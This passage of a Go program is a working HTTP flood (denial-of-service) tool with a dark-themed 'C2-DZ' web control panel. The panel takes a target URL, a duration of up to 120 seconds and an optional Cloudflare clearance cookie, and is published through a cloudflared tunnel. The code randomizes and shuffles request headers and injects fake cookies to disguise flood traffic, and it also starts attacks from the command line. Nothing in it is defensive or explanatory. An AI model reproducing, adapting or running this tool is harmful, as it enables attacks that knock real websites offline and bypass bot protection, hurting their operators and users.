				if cookie != "" {
					cookies = append(cookies, cookie)
				}
				for _, name := range COOKIES {
					if rng.Intn(2) == 0 {
						cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))
					}
				}
				if len(cookies) > 0 {
					headers = append(headers, headerItem{"Cookie", strings.Join(cookies, "; ")})
				}

				if rng.Intn(10) == 0 {
					headers = append(headers, headerItem{"Accept-Datetime", time.Now().Format(time.RFC1123)})
				}
				if rng.Intn(20) == 0 {
					headers = append(headers, headerItem{"From", "crawler@example.com"})
				}

				rng.Shuffle(len(headers), func(i, j int) {
					headers[i], headers[j] = headers[j], headers[i]
				})
				req.Header = make(http.Header)
				for _, h := range headers {
					req.Header.Set(h.key, h.value)
				}
				resp, err := cli.client.Do(req)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
			}
		}(c, i)
	}
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg2.Wait()
	fmt.Println()
}

var (
	stateMutex        sync.Mutex
	attackState       string
	cooldownUntil     time.Time
	attackOwnerIP     string
	attackOwnerTarget string
	attackStartTime   time.Time
	attackDuration    int
)

var (
	tunnelMutex sync.Mutex
	tunnelHost  string
	tunnelReady bool
)

var (
	ipCooldownMutex sync.Mutex
	ipCooldownMap   = make(map[string]time.Time)
	ipTargetMutex   sync.Mutex
	ipTargetLast    = make(map[string]time.Time)
)

func getClientIP(r *http.Request) string {
	if cfIP := r.Header.Get("Cf-Connecting-Ip"); cfIP != "" {
		return cfIP
	}
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		ips := strings.Split(xff, ",")
		if len(ips) > 0 {
			return strings.TrimSpace(ips[0])
		}
	}
	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
	return ip
}

const webHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2-DZ</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0b0b0b;
            color: #e0e0e0;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .dashboard { max-width:780px; width:100%; }
        .header {
            display: flex;
            align-items: baseline;
            justify-content: space-between;
            border-bottom:1px solid #2a2a2a;
            padding-bottom:12px;
            margin-bottom:28px;
        }
        .header h1 { font-weight:300; font-size:1.8rem; letter-spacing:1px; color:#f0f0f0; white-space:nowrap; }
        .header h1 span { color:#e74c3c; font-weight:400; }
        .header .status { font-size:0.8rem; color:#7c7c7c; letter-spacing:0.5px; white-space:nowrap; }
        .header .status .dot {
            display:inline-block; width:8px; height:8px;
            border-radius:50%; margin-right:6px;
        }
        .dot.ready { background:#2ecc71; }
        .dot.busy { background:#e74c3c; animation:pulse 1s infinite; }
        .dot.cooldown { background:#f39c12; animation:pulse 1s infinite; }
        .dot.waiting { background:#3498db; animation:pulse 1s infinite; }
        .dot.offline { background:#666; }
        @keyframes pulse { 0% { opacity:1; } 50% { opacity:0.4; } 100% { opacity:1; } }
        .info-grid {
            display:grid; grid-template-columns:1fr 1fr; gap:6px 30px;
            margin-bottom:30px; padding:0 2px; font-size:0.9rem;
        }
        .info-grid .item {
            display:flex; justify-content:space-between;
            padding:6px 0; border-bottom:1px solid #1e1e1e;
            word-break: break-all;
        }
        .info-grid .item .label { color:#7c7c7c; flex-shrink:0; margin-right:10px; }
        .info-grid .item .value { color:#e0e0e0; font-weight:400; text-align:right; }
        .section-title {
            font-size:0.75rem; text-transform:uppercase; letter-spacing:1.5px;
            color:#5c5c5c; margin:28px 0 14px 0;
            border-bottom:1px solid #1a1a1a; padding-bottom:6px;
        }
        .form-group { margin-bottom:16px; }
        .form-group label { display:block; font-size:0.8rem; color:#b0b0b0; margin-bottom:4px; letter-spacing:0.3px; }
        .form-group .input-wrapper {
            position:relative;
            width:100%;
        }
        .form-group .input-wrapper input,
        .form-group .input-wrapper select {
            width:100%; padding:10px 40px 10px 36px; background:#161616;
            border:1px solid #2a2a2a; border-radius:4px; color:#f0f0f0;
            font-size:0.95rem; transition:border 0.2s; outline:none;
            appearance:none; -webkit-appearance:none;
        }
        .form-group .input-wrapper input:focus,
        .form-group .input-wrapper select:focus { border-color:#e74c3c; }
        .form-group .input-wrapper input::placeholder { color:#555; }
        .form-group .input-wrapper input[type="password"] {
            -webkit-text-security: disc;
            text-security: disc;
        }
        .form-group .input-wrapper .input-icon {
            position:absolute; left:12px; top:50%; transform:translateY(-50%);
            color:#555; font-size:0.9rem; pointer-events:none;
        }
        .form-group .input-wrapper .toggle-eye {
            position:absolute; right:12px; top:50%; transform:translateY(-50%);
            background:transparent; border:none; color:#7c7c7c;
            cursor:pointer; font-size:1rem; padding:4px; line-height:1;
            transition:color 0.2s;
        }
        .form-group .input-wrapper .toggle-eye:hover { color:#e0e0e0; }
        .form-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
        .btn {
            display:inline-block; width:100%; padding:12px;
            background:#e74c3c; border:none; border-radius:4px;
            color:#fff; font-weight:500; font-size:1rem; letter-spacing:1px;
            cursor:pointer; transition:background 0.2s, transform 0.1s; margin-top:8px;
        }
        .btn:hover:not(:disabled) { background:#c0392b; }
        .btn:active { transform:scale(0.98); }
        .btn:disabled { opacity:0.5; cursor:not-allowed; background:#555; }
        .btn-test {
            background:#2a2a2a; border:1px solid #3a3a3a; margin-top:4px;
        }
        .btn-test:hover:not(:disabled) { background:#3a3a3a; }
        .btn-test.success { border-color:#2ecc71; color:#2ecc71; }
        .btn-test.error { border-color:#e74c3c; color:#e74c3c; }
        .log-area {
            margin-top:30px; border-top:1px solid #1e1e1e; padding-top:16px;
        }
        .log-area .log-header {
            display:flex; justify-content:space-between;
            font-size:0.7rem; color:#5c5c5c; letter-spacing:0.5px; margin-bottom:6px;
        }
        .log-area .log-content {
            background:#0f0f0f; padding:12px 14px; border-radius:4px;
            font-family:'Fira Code', monospace; font-size:0.8rem; color:#a0a0a0;
            max-height:160px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;
            border-left:2px solid #2a2a2a;
        }
        .log-area .log-content .attack-started { color:#2ecc71; }
        .log-area .log-content .error { color:#e74c3c; }
        .log-area .log-content .cooldown-info { color:#f39c12; }
        .log-area .log-content .system { color:#3498db; }
        .footer {
            margin-top:30px; font-size:0.7rem; color:#3a3a3a;
            text-align:center; border-top:1px solid #1a1a1a; padding-top:16px;
        }
        .log-content::-webkit-scrollbar { width:4px; }
        .log-content::-webkit-scrollbar-track { background:#0f0f0f; }
        .log-content::-webkit-scrollbar-thumb { background:#2a2a2a; border-radius:4px; }

        @media (max-width:600px) {
            body { align-items:flex-start; padding:16px; }
            .header h1 { font-size:1.4rem; }
            .header .status { font-size:0.7rem; }
            .info-grid { grid-template-columns:1fr; gap:4px; }
            .form-row { grid-template-columns:1fr; gap:0; }
            .form-group .input-wrapper input,
            .form-group .input-wrapper select {
                font-size:0.85rem;
                padding:8px 36px 8px 32px;
            }
            .form-group .input-wrapper .input-icon { font-size:0.8rem; }
            .form-group .input-wrapper .toggle-eye { font-size:0.9rem; }
            .btn { font-size:0.9rem; padding:10px; }
            .log-area .log-content { font-size:0.7rem; max-height:120px; }
        }
    </style>
</head>
<body>
<div class="dashboard">
    <div class="header">
        <h1>C2-<span>DZ</span></h1>
        <div class="status"><span class="dot ready" id="statusDot"></span> <span id="statusText">Ready</span></div>
    </div>
    <div class="info-grid">
        <div class="item"><span class="label">Duration</span><span class="value" id="info-duration">—</span></div>
        <div class="item"><span class="label">Cookie</span><span class="value" id="info-cookie">—</span></div>
        <div class="item"><span class="label">Status</span><span class="value" id="info-status">—</span></div>
        <div class="item"><span class="label">Cooldown</span><span class="value" id="info-ipcooldown">—</span></div>
        <div class="item"><span class="label">Dilarang Sampai</span><span class="value" id="info-ipbanned">—</span></div>
    </div>
    <div class="section-title">configuration</div>
    <form id="attack-form" action="/start" method="post">
        <div class="form-group">
            <label for="target">Target</label>
            <input type="text" id="target" name="target" placeholder="https://example.com" required>
        </div>
        <div class="form-row">
            <div class="form-group">
                <label for="duration">Duration (max 120)</label>
                <input type="number" id="duration" name="duration" value="60" min="1" max="120" required>
            </div>
            <div class="form-group">
                <label for="cookie">Cookie (Optional)</label>
                <input type="text" id="cookie" name="cookie" placeholder="cf_clearance=...">
            </div>
        </div>
        <button type="submit" class="btn" id="launchBtn">Gass</button>
    </form>
    <div class="log-area">
        <div class="log-header"><span>Output Terminal</span><span id="log-count">0 Data</span></div>
        <div class="log-content" id="log-content">[system] Ready</div>
    </div>
    <div class="footer">YT : DIZFLYZE</div>
</div>
<script>
    var attackStartTime = null;
    var timerInterval = null;

    function updateUI(displayStatus, cooldownRemaining, state, startTime) {
        var dot = document.getElementById('statusDot');
        var statusText = document.getElementById('statusText');
        var infoStatus = document.getElementById('info-status');
        var btn = document.getElementById('launchBtn');
        var durationInput = document.getElementById('duration');

        if (state === 'attacking') {
            if (startTime) {
                attackStartTime = startTime;
                if (!timerInterval) {
                    timerInterval = setInterval(function() {
                        var now = Math.floor(Date.now() / 1000);
                        var elapsed = now - attackStartTime;
                        if (elapsed < 0) elapsed = 0;
                        var msg = displayStatus + ' (' + elapsed + 's)';
                        statusText.textContent = msg;
                        infoStatus.textContent = msg;
                    }, 1000);
                }
            }
            dot.className = 'dot busy';
            statusText.textContent = displayStatus + ' (0s)';
            infoStatus.textContent = displayStatus + ' (0s)';
            btn.disabled = true;
            btn.textContent = 'Attacking';
            durationInput.disabled = true;
        } else if (state === 'cooldown') {
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
                attackStartTime = null;
            }
            var msg = 'Tunggu ' + cooldownRemaining + 's';
            dot.className = 'dot cooldown';
            statusText.textContent = msg;
            infoStatus.textContent = msg;
            btn.disabled = true;
            btn.textContent = 'Cooldown ' + cooldownRemaining + 's';
            durationInput.disabled = true;
        } else {
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
                attackStartTime = null;
            }
            dot.className = 'dot ready';
            statusText.textContent = 'Ready';
            infoStatus.textContent = 'Ready';
            btn.disabled = false;
            btn.textContent = 'Gass';
            durationInput.disabled = false;
        }
    }

    function fetchStatus() {
        fetch('/status')
            .then(function(res) { return res.json(); })
            .then(function(data) {
                updateUI(data.display_status, data.cooldown || 0, data.state, data.start_time);
                document.getElementById('info-ipcooldown').textContent = data.ip_cooldown > 0 ? data.ip_cooldown + 's' : '—';
                document.getElementById('info-ipbanned').textContent = data.ip_banned > 0 ? data.ip_banned + 's' : '—';
            })
            .catch(function() {  });
    }

    fetchStatus();
    setInterval(fetchStatus, 1000);

    document.getElementById('attack-form').addEventListener('submit', function(e) {
        e.preventDefault();
        var form = this;
        var formData = new FormData(form);
        var target = formData.get('target');
        var duration = formData.get('duration');
        var cookie = formData.get('cookie') || '—';

        document.getElementById('info-duration').textContent = duration + 's';
        document.getElementById('info-cookie').textContent = cookie;

        var log = document.getElementById('log-content');
        var time = new Date().toLocaleTimeString();
        var entry = '[' + time + '] attack started on ' + target + ' (' + duration + 's)';
        log.innerHTML = '<span class="attack-started">' + entry + '</span>\n' + log.innerHTML;
        var lines = log.innerHTML.split('\n');
        if (lines.length > 20) {
            log.innerHTML = lines.slice(0, 20).join('\n');
        }
        document.getElementById('log-count').textContent = (lines.length) + ' events';

        fetch('/start', {
            method: 'POST',
            body: formData
        }).then(function(response) {
            if (response.status === 409) {
                return response.text().then(function(text) {
                    throw new Error('Conflict: ' + text);
                });
            } else if (response.status === 429) {
                return response.text().then(function(text) {
                    throw new Error('Cooldown: ' + text);
                });
            }
            return response.text();
        }).then(function(text) {
            var time2 = new Date().toLocaleTimeString();
            var entry2 = '[' + time2 + '] ' + text;
            log.innerHTML = entry2 + '\n' + log.innerHTML;
        }).catch(function(err) {
            var time2 = new Date().toLocaleTimeString();
            var entry2 = '[' + time2 + '] error: ' + err.message;
            log.innerHTML = '<span class="error">' + entry2 + '</span>\n' + log.innerHTML;
            fetchStatus();
        });
    });

    function updateLogCount() {
        var log = document.getElementById('log-content');
        var lines = log.innerHTML.split('\n').filter(function(l) { return l.trim() !== ''; });
        document.getElementById('log-count').textContent = lines.length + ' events';
    }
    updateLogCount();
</script>
</body>
</html>`

func startWebAndTunnel() {
	listener, err := net.Listen("tcp", ":0")
	if err != nil {
		fmt.Println("Gagal mendapatkan port:", err)
		os.Exit(1)
	}
	port := listener.Addr().(*net.TCPAddr).Port

	go func() {
		ticker := time.NewTicker(10 * time.Minute)
		for range ticker.C {
			ipCooldownMutex.Lock()
			now := time.Now()
			for ip, t := range ipCooldownMap {
				if now.After(t) {
					delete(ipCooldownMap, ip)
				}
			}
			ipCooldownMutex.Unlock()
			ipTargetMutex.Lock()
			now = time.Now()
			for k, t := range ipTargetLast {
				if now.After(t) {
					delete(ipTargetLast, k)
				}
			}
			ipTargetMutex.Unlock()
		}
	}()

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprint(w, webHTML)
	})

	http.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
		stateMutex.Lock()
		state := attackState
		cooldown := 0
		var startTime int64 = 0
		if state == "cooldown" {
			rem := time.Until(cooldownUntil)
			if rem > 0 {
				cooldown = int(rem.Seconds()) + 1
			} else {
				cooldown = 0
				if attackState == "cooldown" {
					attackState = "idle"
					state = "idle"
					attackOwnerIP = ""
					attackOwnerTarget = ""
				}
			}
		} else if state == "attacking" {
			startTime = attackStartTime.Unix()
		}
		ownerIP := attackOwnerIP
		stateMutex.Unlock()

		clientIP := getClientIP(r)
		ipCooldownMutex.Lock()
		ipCooldownRem := 0
		if t, exists := ipCooldownMap[clientIP]; exists {
			rem := time.Until(t)
			if rem > 0 {
				ipCooldownRem = int(rem.Seconds()) + 1
			} else {
				delete(ipCooldownMap, clientIP)
			}
		}
		ipCooldownMutex.Unlock()

		ipTargetMutex.Lock()
		ipBannedRem := 0
		prefix := clientIP + "|"
		for key, t := range ipTargetLast {
			if strings.HasPrefix(key, prefix) {
				rem := time.Until(t)
				if rem > 0 {
					secs := int(rem.Seconds()) + 1
					if secs > ipBannedRem {
						ipBannedRem = secs
					}
				}
			}
		}
		ipTargetMutex.Unlock()

		displayStatus := "Ready"
		if state == "attacking" {
			if clientIP == ownerIP {
				displayStatus = "Attacking"
			} else {
				displayStatus = "Antri Ya"
			}
		} else if state == "cooldown" {
			displayStatus = fmt.Sprintf("Tunggu %ds", cooldown)
		}

		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"state":"%s","cooldown":%d,"ip_cooldown":%d,"ip_banned":%d,"display_status":"%s","start_time":%d}`,
			state, cooldown, ipCooldownRem, ipBannedRem, displayStatus, startTime)
	})

	http.HandleFunc("/start", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		tunnelMutex.Lock()
		if !tunnelReady {
			tunnelMutex.Unlock()
			http.Error(w, "Tunnel not ready yet", http.StatusServiceUnavailable)
			return
		}
		tHost := tunnelHost
		tunnelMutex.Unlock()

		target := r.FormValue("target")
		durationStr := r.FormValue("duration")
		cookie := r.FormValue("cookie")

		dur, err := strconv.Atoi(durationStr)
		if err != nil || dur <= 0 || dur > 120 {
			stateMutex.Lock()
			attackState = "idle"
			attackOwnerIP = ""
			attackOwnerTarget = ""
			stateMutex.Unlock()
			http.Error(w, "Duration must be 1-120", http.StatusBadRequest)
			return
		}

		if target == "" {
			stateMutex.Lock()
			attackState = "idle"
			attackOwnerIP = ""
			attackOwnerTarget = ""
			stateMutex.Unlock()
			http.Error(w, "Target required", http.StatusBadRequest)
			return
		}

		parsedTarget, err := url.Parse(target)
		if err != nil {
			stateMutex.Lock()
			attackState = "idle"
			attackOwnerIP = ""
			attackOwnerTarget = ""
			stateMutex.Unlock()
			http.Error(w, "Invalid target URL", http.StatusBadRequest)
			return
		}

		targetHost := parsedTarget.Hostname()
		normalize := func(h string) string {
			h = strings.ToLower(h)
			if strings.HasPrefix(h, "www.") {
				h = h[4:]
			}
			return h
		}

		if normalize(targetHost) == normalize(tHost) {
			stateMutex.Lock()
			attackState = "idle"
			attackOwnerIP = ""
			attackOwnerTarget = ""
			stateMutex.Unlock()
			http.Error(w, "You Are IDIOT", http.StatusBadRequest)
			return
		}

		clientIP := getClientIP(r)
		key := clientIP + "|" + target
		ipTargetMutex.Lock()
		expiry, exists := ipTargetLast[key]
		now := time.Now()
		if exists && now.Before(expiry) {
			ipTargetMutex.Unlock()
			http.Error(w, "You are banned for 1 minute", http.StatusForbidden)
			return
		}
		ipTargetMutex.Unlock()

		ipCooldownMutex.Lock()
		if t, exists := ipCooldownMap[clientIP]; exists && now.Before(t) {
			remaining := int(time.Until(t).Seconds()) + 1
			ipCooldownMutex.Unlock()
			http.Error(w, fmt.Sprintf("Please waiting %d seconds", remaining), http.StatusTooManyRequests)
			return
		}
		ipCooldownMutex.Unlock()

		stateMutex.Lock()
		state := attackState
		if state == "cooldown" {
			rem := time.Until(cooldownUntil)
			if rem > 0 {
				cooldown := int(rem.Seconds()) + 1
				stateMutex.Unlock()
				http.Error(w, fmt.Sprintf("Cooldown %d seconds remaining", cooldown), http.StatusTooManyRequests)
				return
			} else {
				attackState = "idle"
				state = "idle"
				attackOwnerIP = ""
				attackOwnerTarget = ""
			}
		}
		if state == "attacking" {
			stateMutex.Unlock()
			http.Error(w, "Attack already running. Please wait.", http.StatusConflict)
			return
		}

		attackState = "attacking"
		attackOwnerIP = clientIP
		attackOwnerTarget = target
		attackStartTime = time.Now()
		attackDuration = dur
		stateMutex.Unlock()

		go func(ip string, tgt string, duration int) {
			runAttack(tgt, duration, cookie)
			stateMutex.Lock()
			attackState = "cooldown"
			cooldownUntil = time.Now().Add(30 * time.Second)
			stateMutex.Unlock()
			ipCooldownMutex.Lock()
			ipCooldownMap[ip] = time.Now().Add(1 * time.Minute)
			ipCooldownMutex.Unlock()
			ipTargetMutex.Lock()
			ipTargetLast[ip+"|"+tgt] = time.Now().Add(1 * time.Minute)
			ipTargetMutex.Unlock()
		}(clientIP, target, dur)

		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "Attack started on %s for %ds", target, dur)
	})

	server := &http.Server{Addr: fmt.Sprintf(":%d", port)}
	go func() {
		fmt.Printf("Web server running on http://localhost:%d\n", port)
		if err := server.Serve(listener); err != nil && err != http.ErrServerClosed {
			fmt.Println("Server error:", err)
		}
	}()

	cmd := exec.Command("cloudflared", "tunnel", "--url", fmt.Sprintf("http://localhost:%d", port))
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()
	var wg sync.WaitGroup
	wg.Add(2)
	tunnelURL := ""
	var urlMu sync.Mutex

	scanAndFind := func(rc io.ReadCloser) {
		defer wg.Done()
		scanner := bufio.NewScanner(rc)
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, "https://") && strings.Contains(line, ".trycloudflare.com") {
				parts := strings.Fields(line)
				for _, p := range parts {
					if strings.HasPrefix(p, "https://") && strings.Contains(p, ".trycloudflare.com") {
						urlMu.Lock()
						if tunnelURL == "" {
							tunnelURL = p
							if u, err := url.Parse(p); err == nil {
								tunnelMutex.Lock()
								tunnelHost = u.Hostname()
								tunnelReady = true
								tunnelMutex.Unlock()
							}
						}
						urlMu.Unlock()
						return
					}
				}
			}
		}
	}

	go scanAndFind(stdout)
	go scanAndFind(stderr)

	if err := cmd.Start(); err != nil {
		fmt.Println("Gagal menjalankan cloudflared:", err)
		fmt.Println("Pastikan cloudflared sudah terinstall (https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/)")
		os.Exit(1)
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
	case <-time.After(30 * time.Second):
		fmt.Println("Timeout menunggu tunnel URL.")
	}

	if tunnelURL == "" {
		fmt.Println("Tidak dapat menemukan URL tunnel dari output cloudflared.")
	} else {
		fmt.Printf("\n🌐 Tunnel URL: %s\n", tunnelURL)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig
	fmt.Println("\nShutting down...")
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	server.Shutdown(ctx)
	cmd.Process.Kill()
}

func main() {
	if len(os.Args) == 1 {
		startWebAndTunnel()
		return
	}
	if len(os.Args) < 2 {
		fmt.Println("Cara pakai: ./main <target> <duration> <cookie>")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			if d > 120 {
				fmt.Println("Durasi maksimal 120s")
				dur = 120
			} else {
				dur = d
			}
		}
	}
	cookie := ""
	if len(os.Args) >= 4 {
		cookie = os.Args[3]
	}
	if dur == 0 {
		dur = 120
	}
	runAttack(tgt, dur, cookie)
}
